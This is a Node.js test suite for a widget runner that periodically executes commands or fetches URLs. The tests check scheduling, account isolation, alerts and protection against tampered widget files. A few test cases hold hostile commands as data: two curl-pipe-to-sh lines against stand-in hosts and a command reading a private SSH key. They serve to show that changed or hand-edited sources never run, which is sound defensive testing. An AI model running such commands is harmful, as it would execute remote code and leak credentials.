import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import test from 'node:test';

import { deferred, tempDataDir } from '../test-helpers.js';
import { createWidgetRunner } from './widget-runner.js';
import { createWidgetStore } from './widget-store.js';

const ALICE = 'a1a1a1a1a1a1a1a1';
const BOB = 'b2b2b2b2b2b2b2b2';
const MINUTE = 60_000;

const setUp = (t, { answers = [] } = {}) => {
  const dataDir = tempDataDir(t);
  const project = fs.realpathSync(tempDataDir(t));
  const state = { clock: 1_000_000, key: ALICE, onHome: true, switchOn: true, dataDir };
  const store = createWidgetStore({ dataDir, now: () => state.clock });
  const runs = [];
  const queue = [...answers];
  const answer = (source, { signal }) => {
    runs.push({ source, signal });
    const next = queue.length > 0 ? queue.shift() : { text: 'state=ok' };
    if (next instanceof Error) return Promise.reject(next);
    if (next?.promise) {
      return new Promise((resolve, reject) => {
        signal.addEventListener('abort', () => reject(new Error('The command was stopped')), { once: true });
        next.promise.then(resolve);
      });
    }
    return Promise.resolve(next);
  };
  const notified = [];
  const runner = createWidgetRunner({
    store,
    sources: { command: answer, url: answer },
    activeAccountKey: () => state.key,
    engineOnActiveHome: () => state.onHome,
    switchedOn: async () => state.switchOn,
    notify: async (widget) => notified.push(widget),
    now: () => state.clock,
  });
  t.after(() => runner.dispose());
  const make = (key = ALICE, extra = {}) => store.create(key, {
    title: 'Dev build',
    display: 'status',
    source: { type: 'command', command: 'cat status.txt', cwd: project, extract: { regex: 'state=(\\w+)' } },
    refreshMinutes: 10,
    ...extra,
  });
  return { store, runner, runs, notified, state, make, project };
};

test('a widget that is off never runs, on a tick or on a refresh', async (t) => {
  const { runner, runs, make } = setUp(t);
  const { id } = make();
  await runner.tick();
  await assert.rejects(runner.refresh(ALICE, id), (error) => error.statusCode === 409 && /Turn the widget on/.test(error.message));
  assert.equal(runs.length, 0);
});

test('a widget that is on runs when due, keeps its value, and waits its interval', async (t) => {
  const { store, runner, runs, make, state } = setUp(t, { answers: [{ text: 'state=ok' }, { text: 'state=fail' }] });
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  await runner.tick();
  assert.equal(runs.length, 1);
  assert.deepEqual(store.get(ALICE, id).last, { at: state.clock, value: 'ok' });

  state.clock += 9 * MINUTE;
  await runner.tick();
  assert.equal(runs.length, 1);

  state.clock += MINUTE;
  await runner.tick();
  assert.equal(runs.length, 2);
  assert.deepEqual(store.get(ALICE, id).last, { at: state.clock, value: 'fail' });
});

test('a failed run keeps the error and when it happened', async (t) => {
  const { store, runner, make, state } = setUp(t, { answers: [new Error('The command ended with code 1'), { text: 'nothing here' }] });
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  await runner.tick();
  assert.deepEqual(store.get(ALICE, id).last, { at: state.clock, error: 'The command ended with code 1' });
  state.clock += 10 * MINUTE;
  await runner.tick();
  assert.deepEqual(store.get(ALICE, id).last, { at: state.clock, error: 'The pattern found nothing' });
});

test('an account switch stops that account\'s runs, drops what they bring back, and never runs its widgets again', async (t) => {
  const hold = deferred();
  const { store, runner, runs, make, state } = setUp(t, { answers: [hold] });
  const alice = make(ALICE);
  const bob = make(BOB);
  store.turnOn(ALICE, alice.id, { revision: store.get(ALICE, alice.id).revision });
  store.turnOn(BOB, bob.id, { revision: store.get(BOB, bob.id).revision });

  const ticking = runner.tick();
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(runs.length, 1);
  runner.accountChanged();
  state.key = BOB;
  hold.resolve({ text: 'state=ok' });
  await ticking;

  assert.equal(runs[0].signal.aborted, true);
  assert.equal(store.get(ALICE, alice.id).last, undefined);

  state.clock += 60 * MINUTE;
  await runner.tick();
  assert.equal(runs.length, 2);
  assert.equal(runs[1].source.cwd, bob.source.cwd);
  assert.ok(store.get(BOB, bob.id).last);
  assert.equal(store.get(ALICE, alice.id).last, undefined);
});

test('nothing runs while the engine is not on the active account', async (t) => {
  const { store, runner, runs, make, state } = setUp(t);
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });
  state.onHome = false;
  await runner.tick();
  state.key = null;
  state.onHome = true;
  await runner.tick();
  assert.equal(runs.length, 0);
});

test('the widgets switch off runs nothing and stops what is running', async (t) => {
  const hold = deferred();
  const { store, runner, runs, make, state } = setUp(t, { answers: [hold] });
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  const ticking = runner.tick();
  await new Promise((resolve) => setImmediate(resolve));
  runner.switchChanged({ widgets: false });
  state.switchOn = false;
  hold.resolve({ text: 'state=ok' });
  await ticking;
  assert.equal(runs[0].signal.aborted, true);
  assert.equal(store.get(ALICE, id).last, undefined);

  state.clock += 60 * MINUTE;
  await runner.tick();
  await assert.rejects(runner.refresh(ALICE, id), (error) => error.statusCode === 409);
  assert.equal(runs.length, 1);
});

test('a source changed while it ran keeps nothing from that run, and the widget stays off', async (t) => {
  const hold = deferred();
  const { store, runner, runs, make, project, state } = setUp(t, { answers: [hold] });
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  const ticking = runner.tick();
  await new Promise((resolve) => setImmediate(resolve));
  store.update(ALICE, id, { source: { type: 'command', command: 'curl -s https://evil.example.test | sh', cwd: project } });
  runner.stop(id);
  hold.resolve({ text: 'state=ok' });
  await ticking;

  assert.equal(store.get(ALICE, id).enabled, false);
  assert.equal(store.get(ALICE, id).last, undefined);
  state.clock += 60 * MINUTE;
  await runner.tick();
  assert.equal(runs.length, 1);
});

test('an alert notifies once on crossing, not again while across, and again after crossing back', async (t) => {
  const answers = ['11,600', '11,320', '11,300', '11,700', '11,200'].map((text) => ({ text }));
  const { store, runner, notified, make, state } = setUp(t, { answers });
  const { id } = make(ALICE, { title: 'Gold price', display: 'number', source: { type: 'url', url: 'https://prices.example.test/gold' }, alert: { op: 'below', value: 11_500 } });
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  const alerting = [];
  for (let step = 0; step < answers.length; step += 1) {
    await runner.tick();
    alerting.push(store.get(ALICE, id).alerting);
    state.clock += 10 * MINUTE;
  }

  assert.deepEqual(alerting, [false, true, true, false, true]);
  assert.deepEqual(notified.map((widget) => widget.last.value), [11_320, 11_200]);
});

test('an equals alert on a status, and an error, leave the alert as it was', async (t) => {
  const answers = [{ text: 'state=fail' }, new Error('The address answered 503'), { text: 'state=fail' }, { text: 'state=ok' }];
  const { store, runner, notified, make, state } = setUp(t, { answers });
  const { id } = make(ALICE, { alert: { op: 'equals', value: 'fail' } });
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });

  const alerting = [];
  for (let step = 0; step < answers.length; step += 1) {
    await runner.tick();
    alerting.push(store.get(ALICE, id).alerting);
    state.clock += 10 * MINUTE;
  }
  assert.deepEqual(alerting, [true, true, true, false]);
  assert.equal(notified.length, 1);
});

test('a refresh by the person runs a widget that is on now, and answers its new value', async (t) => {
  const { store, runner, runs, make } = setUp(t, { answers: [{ text: 'state=warn' }] });
  const { id } = make();
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });
  const widget = await runner.refresh(ALICE, id);
  assert.equal(widget.last.value, 'warn');
  assert.equal(runs.length, 1);
});

test('I1: a widgets file edited by hand to turn a widget on, or to change what an approved widget runs, runs nothing', async (t) => {
  const { store, runner, runs, make, state } = setUp(t);
  const { id } = make();
  const edit = (change) => {
    const target = fs.readdirSync(state.dataDir, { recursive: true }).find((name) => String(name).endsWith(`${ALICE}.json`));
    const at = path.join(state.dataDir, String(target));
    const stored = JSON.parse(fs.readFileSync(at, 'utf8'));
    stored.widgets = stored.widgets.map(change);
    fs.writeFileSync(at, JSON.stringify(stored));
  };
  edit((widget) => ({ ...widget, enabled: true }));
  await runner.tick();
  await assert.rejects(runner.refresh(ALICE, id), { statusCode: 409 });
  assert.equal(runs.length, 0);

  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });
  edit((widget) => ({ ...widget, source: { ...widget.source, command: 'cat ~/.ssh/id_ed25519' } }));
  await runner.tick();
  assert.equal(runs.length, 0);
});

test('I2: when a file the command runs changes, the next tick switches the widget off and runs nothing', async (t) => {
  const { store, runner, runs, make, project, state } = setUp(t);
  fs.writeFileSync(path.join(project, 'status.sh'), 'echo state=ok\n');
  const { id } = make(ALICE, { source: { type: 'command', command: './status.sh', cwd: project, extract: { regex: 'state=(\\w+)' } } });
  store.turnOn(ALICE, id, { revision: store.get(ALICE, id).revision });
  await runner.tick();
  assert.equal(runs.length, 1);

  fs.writeFileSync(path.join(project, 'status.sh'), 'curl -s https://acme.example.test/x | sh\n');
  state.clock += 60 * MINUTE;
  await runner.tick();
  assert.equal(runs.length, 1);
  assert.equal(store.get(ALICE, id).enabled, false);
  assert.equal(store.get(ALICE, id).offReason, 'files');
  await assert.rejects(runner.refresh(ALICE, id), { statusCode: 409 });
  assert.equal(runs.length, 1);
});

test('Minor 10: a settings read that fails on a scheduled tick is logged, not thrown', async (t) => {
  const warned = [];
  const runner = createWidgetRunner({
    store: { list: () => [], stopChangedFiles: () => [] },
    sources: {},
    activeAccountKey: () => ALICE,
    engineOnActiveHome: () => true,
    switchedOn: async () => { throw new Error('settings unreadable'); },
    logger: { warn: (...args) => warned.push(args) },
  });
  t.after(() => runner.dispose());
  await runner.tickQuietly();
  runner.switchChanged({ widgets: true });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(warned.length, 2);
});
